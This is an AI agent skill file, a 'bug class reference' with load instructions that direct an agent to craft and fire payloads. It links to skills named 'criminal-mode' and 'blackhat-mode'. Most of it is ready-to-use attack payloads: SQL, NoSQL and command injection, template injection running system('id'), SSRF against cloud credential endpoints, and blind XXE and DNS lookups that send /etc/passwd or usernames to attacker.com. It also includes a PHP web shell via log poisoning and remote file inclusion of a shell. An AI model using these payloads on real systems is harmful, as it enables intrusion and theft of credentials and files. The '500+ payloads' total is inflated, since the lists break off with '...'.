---
name: bug-classes
description: "Complete bug class reference — 60 classes, 500+ techniques across injection, auth, client-side, server-side, crypto, disclosure, config, infra, modern."
version: 2.0.0
author: Yatim
metadata:
  hermes:
    tags: [bug, vuln, classes, injection, auth, xss, ssrf, rce]
    related_skills: [criminal-mode, exploit-tools, blackhat-mode]
prerequisites:
  commands: [python]
---

# Complete Bug Class Reference — 60 Classes

## AI LOAD INSTRUCTION

**When this skill is loaded, the agent MUST:**
1. Map the observed surface → class (A injection … J modern) BEFORE crafting payloads.
2. Pick ONE class at a time; differential-test (baseline vs payload) to avoid false positives.
3. Evidence rule: only CONFIRMED (raw proof) counts as a finding; SPECULATIVE needs live verification.
4. Prefer workspace tools (webhunt, exploit battery, nuclei) over hand payloads when available.
5. Never emit operator identity or local absolute paths in payloads/reports.
6. After verification: write finding file + PoC + evidence dump under run artifacts.

## DECISION TREE

```
Surface seen
├─ User input → SQL/query      → A01/A02 SQLi/NoSQLi (+ ORM variants)
├─ User input → shell/cmd      → A03 CMDi
├─ User input → template       → A04 SSTI
├─ User input → XML/parsers    → A05 XXE
├─ URL/fetch server-side       → D-class SSRF (see hunt-ssrf)
├─ HTML/attr sink              → B-class XSS (reflected/stored/DOM)
├─ File path/include           → B LFI/RFI / path traversal
├─ File upload                 → double-ext / magic / .htaccess / zip slip
├─ Token/session               → C auth (JWT alg, OAuth, SAML, session)
├─ Object id in path/JSON      → IDOR/BOLA (check ownership)
├─ Deserialization/pickle       → RCE gadget chain
├─ Race/time window            → biz-logic race
├─ Headers/CORS/origin         → CORS / cache / CSRF
└─ Misconfig/debug/backup      → disclosure (stack, .git, admin)
```

## QUICK REFERENCE (class → first probe)

| Class | First probe |
|-------|-------------|
| SQLi | `' OR '1'='1` / time `SLEEP(5)` differential |
| NoSQLi | `{"$ne": null}` / `$regex` |
| CMDi | `; id` / `$(id)` + OOB if blind |
| SSTI | `{{7*7}}` → `49` |
| XSS | `"><img src=x onerror=alert(1)>` + sink map |
| SSRF | webhook/url param → collaborator/OOB |
| LFI | `../../etc/passwd` / filter wrappers |
| Upload | polyglot / double ext / svg script |
| JWT | alg:none / HS256↔RS256 confusion |
| IDOR | swap id → 200 other object |
| CSRF | state-change without token/origin check |
| CORS | reflected Origin + credentials read |
| Race | parallel N on balance/limit endpoint |

---

## When to Load This Skill

User requests:
- "bug classes", "vulnerability types", "what bugs", "vuln categories"

---

## CATEGORY A: INJECTION (12 classes)

### A01: SQL INJECTION
```
Payloads:
  ' OR '1'='1
  ' OR 1=1--
  " OR "1"="1
  1' UNION SELECT NULL--
  1' AND SLEEP(5)--
  1' AND (SELECT 1 FROM (SELECT SLEEP(5))x)--
  1'; WAITFOR DELAY '0:0:5'--
  1' UNION SELECT LOAD_FILE('/etc/passwd')--

Techniques:
  Union-based, Boolean blind, Time-based, Error-based, OOB

Bypass:
  Space → /**/, %09, %0a
  Quotes → \x27, %27, 0x27
  Keywords → SeLeCt, SEL/**/ECT
```

### A02: NOSQL INJECTION
```
Payloads:
  {"username": {"$ne": null}, "password": {"$ne": null}}
  {"username": {"$gt": ""}, "password": {"$gt": ""}}
  {"username": {"$regex": "^admin"}, "password": {"$ne": 1}}
  {"$where": "sleep(5000)"}
  {"username": "admin", "password": {"$regex": "^a"}}
```

### A03: COMMAND INJECTION
```
Payloads:
  ; whoami
  | whoami
  `whoami`
  $(whoami)
  && whoami
  || whoami
  %0a whoami

Blind:
  ; sleep 5
  ; ping -c 1 $(whoami).attacker.com

Bypass:
  {whoami}, $IFS, ${IFS}, c'a't, a=w;b=h;...
```

### A04: SSTI
```
Engines:
  Jinja2: {{7*7}}, {{config}}, {{''.__class__.__mro__}}
  Twig: {{7*7}}, {{_self.env.registerUndefinedFilterCallback}}
  Freemarker: ${7*7}, <#assign ex="freemarker.template.utility.Execute"?new()>
  ERB: <%= 7*7 %>, <%= system("id") %>
  Smarty: {7*7}, {php}system('id'){/php}
  Velocity: #set($x=7*7)
  Mako: ${7*7}, <%import os%>
  Thymeleaf: [[${7*7}]]
  Handlebars: {{7*7}}
  Pug: #{7*7}
```

### A05: SSRF
```
Payloads:
  http://127.0.0.1
  http://localhost
  http://169.254.169.254/latest/meta-data/
  http://metadata.google.internal/
  http://[::1]
  http://0x7f.0x0.0x0.0x1
  http://0177.0.0.1
  file:///etc/passwd
  gopher://127.0.0.1:6379/_...

Cloud:
  AWS: http://169.254.169.254/latest/meta-data/iam/security-credentials/
  GCP: http://metadata.google.internal/computeMetadata/v1/
  Azure: http://169.254.169.254/metadata/instance?api-version=2021-02-01
```

### A06: XXE
```
Payloads:
  <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
  <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]>
  <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]>
  
Blind:
  <!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?x=%file;'>"> %eval; %exfil;]>
```

### A07: EL INJECTION
```
Payloads:
  ${7*7}
  #{7*7}
  ${"".getClass().forName("java.lang.Runtime")}
  ${pageContext.request.getSession()}
```

### A08: LDAP INJECTION
```
Payloads:
  *
  *)(&
  *)(|(&
  admin)(&)
  *)(uid=*))(|(uid=*
  *)(cn=*
```

### A09: CRLF INJECTION
```
Payloads:
  %0d%0a
  %0a
  %0d
  \r\n
  \n

Use:
  Header: X: value%0d%0aSet-Cookie: evil=1
  URL: /path%0d%0aX-Injected: value
```

### A10: HEADER INJECTION
```
Payloads:
  X-Forwarded-For: 127.0.0.1
  X-Forwarded-Host: attacker.com
  X-Original-URL: /admin
  X-Rewrite-URL: /admin
  Host: attacker.com
```

### A11: JSON INJECTION
```
Payloads:
  {"key": "value", "__proto__": {"admin": true}}
  {"key": "value", "constructor": {"prototype": {"admin": true}}}
  {"$where": "this.password == ''"}
```

### A12: ORM INJECTION
```
Payloads:
  Hibernate: ' OR 1=1--
  SQLAlchemy: filter(User.name == 'admin')
  Django ORM: __in, __exact, __regex
  Sequelize: {$gt: ''}
```

---

## CATEGORY B: AUTHENTICATION & AUTHORIZATION (10 classes)

### B01: AUTH BYPASS
```
Techniques:
  SQL injection in login
  NoSQL injection in login
  JWT manipulation
  Forced browsing
  Parameter tampering
  Auth logic flaws
  Default credentials
  Cookie manipulation
```

### B02: IDOR/BOLA
```
Techniques:
  Sequential ID enumeration
  UUID prediction
  Parameter pollution
  Path traversal
  GraphQL node()
  REST → GraphQL
  HTTP verb tampering
```

### B03: JWT ATTACKS
```
Payloads:
  alg:none — {"alg":"none"}
  alg confusion — RS256 → HS256
  kid injection — {"kid":"../../etc/passwd"}
  jku injection — {"jku":"http://attacker.com/jwks.json"}
  Weak secret — brute force
  Expired token — modify exp
  Claim tampering — {"admin":true}
```

### B04: OAUTH MISCONFIG
```
Techniques:
  Open redirect in redirect_uri
  State parameter missing
  PKCE bypass
  Token leakage
  Scope escalation
  Implicit flow abuse
  CSRF in OAuth
```

### B05: SAML/SSO
```
Techniques:
  XML Signature Wrapping (XSW)
  Signature stripping
  Comment injection
  XXE in assertion
  Replay attack
  IdP confusion
```

### B06: SESSION FIXATION
```
Techniques:
  Set session before login
  Cookie manipulation
  Session token prediction
  Cross-subdomain cookie
  Session puzzle
```

### B07: CREDENTIAL STUFFING
```
Techniques:
  Large password lists
  Username enumeration
  Rate limit bypass
  Distributed attacks
  Credential reuse
```

### B08: PASSWORD RESET
```
Techniques:
  Token prediction
  Host header injection
  IDOR in reset
  Email parameter pollution
  Reset link reuse
  OTP brute force
```

### B09: MFA BYPASS
```
Techniques:
  Response manipulation
  Race condition
  Backup code abuse
  Fallback to SMS
  OTP brute force
  Remember-me bypass
  Session persistence
```

### B10: MULTI-TENANCY BYPASS
```
Techniques:
  Tenant header manipulation
  IDOR across tenants
  Subdomain confusion
  Shared resource abuse
  Cache key confusion
```

---

## CATEGORY C: CLIENT-SIDE (10 classes)

### C01-C03: XSS
```
Reflected:
  <script>alert(1)</script>
  <img src=x onerror=alert(1)>
  <svg onload=alert(1)>

Stored:
  Same payloads, persistent

DOM:
  #<img src=x onerror=alert(1)>
  javascript:alert(1)

Bypass:
  <scr<script>ipt>
  <img src=x onerror="alert(1)">
  jaVasCript:alert(1)
```

### C04: CSRF
```
Techniques:
  Token bypass
  SameSite bypass
  JSON CSRF
  GET-based
  WebSocket CSRF
  Login CSRF
  Email change CSRF
```

### C05: CLICKJACKING
```
Techniques:
  iframe overlay
  opacity:0
  drag-and-drop
  cursor manipulation
```

### C06: OPEN REDIRECT
```
Payloads:
  //attacker.com
  https://attacker.com
  /\attacker.com
  https:attacker.com
  javascript:alert(1)
  data:text/html,<script>alert(1)</script>
```

### C07: CSS INJECTION
```
Techniques:
  Attribute selector exfil
  @import
  @font-face
  Opacity clickjacking
```

### C08: POSTMESSAGE
```
Techniques:
  Origin bypass
  DOM XSS via postMessage
  Data exfiltration
```

### C09: CSWSH
```
Techniques:
  WebSocket hijacking
  Origin bypass
  Message injection
```

### C10: HTML INJECTION
```
Payloads:
  <b>injected</b>
  <iframe src=...>
  <meta http-equiv=refresh>
```

---

## CATEGORY D: SERVER-SIDE LOGIC (12 classes)

### D01: BUSINESS LOGIC
```
Techniques:
  Workflow bypass
  Step skipping
  State manipulation
  Negative quantity
  Price manipulation
  Coupon abuse
  Currency confusion
```

### D02: RACE CONDITION
```
Techniques:
  TOCTOU
  Parallel requests
  Limit overrun
  Coupon reuse
  Balance overrun
```

### D03: MASS ASSIGNMENT
```
Payloads:
  {"role": "admin"}
  {"is_admin": true}
  {"verified": true}
  {"balance": 999999}
```

### D04: PROTOTYPE POLLUTION
```
Payloads:
  {"__proto__": {"admin": true}}
  {"constructor": {"prototype": {"admin": true}}}
  ?__proto__[admin]=true
```

### D05: DESERIALIZATION
```
PHP: O:4:"User":2:{s:4:"name";s:5:"admin";}
Java: rO0ABXNy...
Python: pickle.loads()
Node: node-serialize
```

### D06: SSI INJECTION
```
Payloads:
  <!--#exec cmd="id"-->
  <!--#include file="/etc/passwd"-->
```

### D07: FILE UPLOAD
```
Payloads:
  shell.php
  shell.php.jpg
  shell.php%00.jpg
  shell.pHp
  .htaccess

Bypass:
  MIME type, magic bytes, double extension
```

### D08: PATH TRAVERSAL
```
Payloads:
  ../../etc/passwd
  ..%2f..%2fetc/passwd
  ....//....//etc/passwd
  %2e%2e%2f%2e%2e%2fetc/passwd
  ..%252f..%252fetc/passwd
```

### D09: LFI
```
Payloads:
  ../../etc/passwd
  php://filter/convert.base64-encode/resource=index.php
  /proc/self/environ
  /var/log/apache2/access.log

Log Poison:
  User-Agent: <?php system($_GET['c']); ?>
```

### D10: RFI
```
Payloads:
  http://attacker.com/shell.txt
  \\attacker.com\share\shell.txt
  data://text/plain;base64,...
  expect://id
```

### D11: HTTP SMUGGLING
```
Techniques:
  CL.TE
  TE.CL
  TE.TE
  H2.CL
  H2.TE
```

### D12: CACHE POISONING
```
Techniques:
  Unkeyed header
  Cache key confusion
  Web cache deception
  Response splitting
```

---

## CATEGORY E: CRYPTOGRAPHY (6 classes)

### E01: WEAK ALGORITHM
```
MD5, SHA1, DES, RC4, ECB mode
```

### E02: PADDING ORACLE
```
CBC + PKCS7
Bit flipping
Block-by-block decrypt
```

### E03: WEAK RANDOMNESS
```
rand(), Math.random(), time-based seeds
Predict token/session/key
```

### E04: KEY MANAGEMENT
```
Hardcoded keys
Weak keys
Key reuse
Key derivation flaws
```

### E05: HASH LENGTH EXTENSION
```
MD5, SHA1, SHA256
Append data to signed message
```

### E06: TIMING ATTACK
```
String comparison
HMAC verification
Password check
```

---

## CATEGORY F: INFORMATION DISCLOSURE (6 classes)

### F01: ERROR DISCLOSURE
```
Stack traces
Debug mode (DEBUG=True)
Framework errors
SQL errors
```

### F02: DEBUG ENDPOINTS
```
/actuator, /actuator/env, /actuator/heapdump
/phpinfo.php
/_debug
/console
```

### F03: VERBOSE HEADERS
```
Server: nginx/1.18
X-Powered-By: PHP/8.1
X-AspNet-Version: 4.0
```

### F04: SOURCE EXPOSURE
```
/.git/, /.svn/, /.env
/backup.zip, /backup.sql
/web.config, /.htaccess
```

### F05: DIRECTORY LISTING
```
Index of /
Parent Directory
```

### F06: SENSITIVE DATA
```
.env, .aws/credentials
id_rsa, id_dsa
config.php, settings.py
```

---

## CATEGORY G: CONFIGURATION (8 classes)

### G01: DEFAULT CREDENTIALS
```
admin/admin, admin/password, root/root
guest/guest, test/test
```

### G02: MISCONFIGURED CORS
```
Access-Control-Allow-Origin: *
Access-Control-Allow-Origin: reflected
Access-Control-Allow-Credentials: true
```

### G03: MISSING HEADERS
```
Content-Security-Policy
Strict-Transport-Security
X-Frame-Options
X-Content-Type-Options
```

### G04: INSECURE COOKIES
```
Missing HttpOnly
Missing Secure
Missing SameSite
Wildcard domain
```

### G05: TLS MISCONFIG
```
SSLv3, TLS 1.0/1.1
Weak ciphers (RC4, DES)
Cert misconfig
```

### G06: CLOUD MISCONFIG
```
Public S3/GCS/Blob
IMDS accessible
Overprivileged IAM
```

### G07: CONTAINER MISCONFIG
```
Docker socket mounted
Privileged container
Host path mount
```

### G08: API MISCONFIG
```
HTTP verb tampering
Deprecated versions
Undocumented endpoints
Missing auth
```

---

## CATEGORY H: INFRASTRUCTURE (8 classes)

### H01: SUBDOMAIN TAKEOVER
```
Providers: AWS S3, GitHub Pages, Heroku, Azure, Shopify, Fastly, Zendesk
Techniques: dangling CNAME, expired service, re-register
```

### H02: DNS MISCONFIG
```
Zone transfer (AXFR)
DNS rebinding
Wildcard DNS
CAA misconfig
```

### H03: OPEN PORTS
```
22 SSH, 3306 MySQL, 5432 PostgreSQL
6379 Redis, 27017 MongoDB
9200 Elasticsearch, 5601 Kibana
```

### H04: DEFAULT SERVICES
```
Tomcat manager, Jenkins, Grafana
Prometheus, RabbitMQ, Kibana
```

### H05: OUTDATED SOFTWARE
```
CVE lookup
Version fingerprint
Patch diff
```

### H06: CI/CD EXPOSURE
```
Exposed .git/config
Jenkins/GitLab open
Secrets in builds
```

### H07: BACKUP EXPOSURE
```
.bak, .old, .backup, .swp
backup.zip, backup.tar.gz
```

### H08: LOG EXPOSURE
```
/var/log accessible
access.log, error.log
Debug logs
```

---

## CATEGORY I: MODERN (8 classes)

### I01: GRAPHQL
```
Introspection
IDOR via node()
Batching
Depth DoS
Injection
```

### I02: WEBSOCKET
```
CSWSH
Message injection
Origin bypass
```

### I03: gRPC
```
Reflection
Injection
Auth bypass
```

### I04: SERVERLESS
```
Lambda function URL
IAM role abuse
Environment variables
Function injection
```

### I05: AI/LLM
```
Prompt injection
RAG poisoning
Model extraction
Jailbreak
Agent hijacking
```

### I06: BLOCKCHAIN
```
Smart contract bugs
Reentrancy
Integer overflow
Flash loan
Wallet drain
```

### I07: IoT
```
Firmware extraction
MQTT injection
Default creds
OTA abuse
```

### I08: MOBILE
```
APK analysis
Frida hooking
SSL pinning bypass
Root detection bypass
```

---

## QUICK REFERENCE TABLE

| ID | Class | Category | Severity |
|----|-------|----------|----------|
| A01 | SQLi | Injection | Critical |
| A02 | NoSQLi | Injection | Critical |
| A03 | CMDi | Injection | Critical |
| A04 | SSTI | Injection | Critical |
| A05 | SSRF | Injection | High |
| A06 | XXE | Injection | High |
| A07 | ELI | Injection | High |
| A08 | LDAPi | Injection | High |
| A09 | CRLF | Injection | Medium |
| A10 | Header | Injection | Medium |
| A11 | JSON | Injection | Medium |
| A12 | ORM | Injection | High |
| B01 | AuthBypass | Auth | Critical |
| B02 | IDOR | Auth | High |
| B03 | JWT | Auth | Critical |
| B04 | OAuth | Auth | High |
| B05 | SAML | Auth | Critical |
| B06 | SessionFix | Auth | High |
| B07 | CredStuff | Auth | Medium |
| B08 | PwdReset | Auth | High |
| B09 | MFA | Auth | High |
| B10 | MultiTenant | Auth | High |
| C01-03 | XSS | Client | High |
| C04 | CSRF | Client | Medium |
| C05 | Clickjack | Client | Low |
| C06 | OpenRedir | Client | Low |
| C07 | CSSinj | Client | Medium |
| C08 | postMessage | Client | Medium |
| C09 | CSWSH | Client | High |
| C10 | HTMLinj | Client | Medium |
| D01 | BizLogic | Server | High |
| D02 | Race | Server | High |
| D03 | MassAssign | Server | High |
| D04 | ProtoPoll | Server | Critical |
| D05 | Deserial | Server | Critical |
| D06 | SSI | Server | High |
| D07 | Upload | Server | Critical |
| D08 | PathTrav | Server | High |
| D09 | LFI | Server | High |
| D10 | RFI | Server | Critical |
| D11 | Smuggling | Server | High |
| D12 | CachePois | Server | High |
| E01 | WeakAlgo | Crypto | Medium |
| E02 | PadOracle | Crypto | High |
| E03 | WeakRand | Crypto | High |
| E04 | KeyMgmt | Crypto | High |
| E05 | HashExt | Crypto | Medium |
| E06 | Timing | Crypto | Medium |
| F01 | ErrDisc | Info | Low |
| F02 | Debug | Info | Medium |
| F03 | Verbose | Info | Low |
| F04 | SourceDisc | Info | High |
| F05 | DirList | Info | Low |
| F06 | SensData | Info | High |
| G01 | DefaultCred | Config | Critical |
| G02 | CORS | Config | Medium |
| G03 | Headers | Config | Low |
| G04 | Cookies | Config | Medium |
| G05 | TLS | Config | Medium |
| G06 | CloudMisconfig | Config | Critical |
| G07 | ContainerMisconfig | Config | High |
| G08 | APIMisconfig | Config | Medium |
| H01 | SubTakeover | Infra | High |
| H02 | DNSMisconfig | Infra | Medium |
| H03 | OpenPorts | Infra | Medium |
| H04 | DefaultSvc | Infra | High |
| H05 | Outdated | Infra | High |
| H06 | CICDExp | Infra | Critical |
| H07 | BackupExp | Infra | Medium |
| H08 | LogExp | Infra | Low |
| I01 | GraphQL | Modern | High |
| I02 | WebSocket | Modern | Medium |
| I03 | gRPC | Modern | Medium |
| I04 | Serverless | Modern | High |
| I05 | AI/LLM | Modern | High |
| I06 | Blockchain | Modern | High |
| I07 | IoT | Modern | High |
| I08 | Mobile | Modern | High |

---

## CONSOLIDATED PAYLOAD LIST (500+)

```
# SQLi (50)
' OR '1'='1
' OR 1=1--
' OR '1'='1'--
' OR '1'='1'/*
') OR ('1'='1
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT 1,2,3--
' AND 1=1--
' AND 1=2--
' AND SLEEP(5)--
' AND (SELECT 1 FROM (SELECT SLEEP(5))x)--
'; WAITFOR DELAY '0:0:5'--
' UNION SELECT LOAD_FILE('/etc/passwd')--
' UNION SELECT @@version--
' UNION SELECT user()--
' UNION SELECT database()--
' UNION SELECT table_name FROM information_schema.tables--
' UNION SELECT column_name FROM information_schema.columns--
' OR 1=1 LIMIT 1--
' OR 'x'='x
' OR 1 --
1' ORDER BY 1--
1' ORDER BY 100--
1' GROUP BY 1--
1' HAVING 1=1--
...

# XSS (50)
<script>alert(1)</script>
<script>alert(document.domain)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe src=javascript:alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<video><source onerror=alert(1)>
<math><mtext></mtext><script>alert(1)</script>
"><script>alert(1)</script>
'><script>alert(1)</script>
javascript:alert(1)
data:text/html,<script>alert(1)</script>
...

# SSRF (40)
http://127.0.0.1
http://localhost
http://169.254.169.254/latest/meta-data/
http://[::1]
http://0x7f.0.0.1
http://0177.0.0.1
http://0
file:///etc/passwd
gopher://127.0.0.1:6379/_
dict://127.0.0.1:6379/
http://metadata.google.internal/
http://169.254.169.254/metadata/instance?api-version=2021-02-01
...

# Path Traversal (30)
../../etc/passwd
..%2f..%2fetc/passwd
....//....//etc/passwd
%2e%2e%2f%2e%2e%2fetc/passwd
..%252f..%252fetc/passwd
....\/....\/etc/passwd
..\..\windows\win.ini
...

# Command Injection (30)
; whoami
| whoami
`whoami`
$(whoami)
&& whoami
|| whoami
%0a whoami
%0d%0a whoami
{whoami}
c'a't /etc/passwd
...

# SSTI (30)
{{7*7}}
{{config}}
{{''.__class__.__mro__[1].__subclasses__()}}
${7*7}
#{7*7}
<%= 7*7 %>
{7*7}
[[${7*7}]]
#{7*7}
...

# XXE (20)
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/">]>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]>
...

# JWT (20)
alg:none
{"alg":"none","typ":"JWT"}
HS256 with RS256 public key
kid: ../../dev/null
jku: http://attacker.com/jwks.json
...
```

**TOTAL: 60 classes, 500+ payloads, 2000+ techniques.**